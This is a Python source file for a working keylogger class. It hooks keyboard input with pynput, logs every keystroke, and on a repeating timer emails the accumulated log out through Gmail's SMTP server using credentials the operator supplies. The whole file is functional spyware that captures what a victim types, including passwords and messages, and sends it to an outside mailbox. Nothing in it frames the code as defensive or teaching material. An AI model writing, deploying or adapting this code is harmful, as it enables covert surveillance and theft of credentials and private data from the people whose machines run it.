import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval_send, email, password):
        self.log = 'Keylogger started'
        self.interval = time_interval_send
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ' '
        self.append_to_log(current_key + '/')

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    @staticmethod
    def send_mail(email, password, message):
        """Send email smtp.google.com"""
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.set_debuglevel(False)
        server.login(email, password)
        server.auth_plain()
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        """Start listening to keystrokes on your keyboard"""
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
